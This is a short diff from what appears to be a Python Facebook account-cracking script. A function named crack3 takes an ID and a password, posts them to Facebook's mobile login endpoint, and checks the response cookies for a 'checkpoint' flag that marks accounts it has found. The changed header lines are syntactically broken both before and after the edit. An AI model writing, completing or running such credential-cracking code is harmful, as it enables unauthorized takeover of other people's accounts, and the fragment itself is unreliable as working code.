@@ -801,7 +801,7 @@ def crack3(idf,pwv):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent':})
+    'user-agent'})
 
 			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
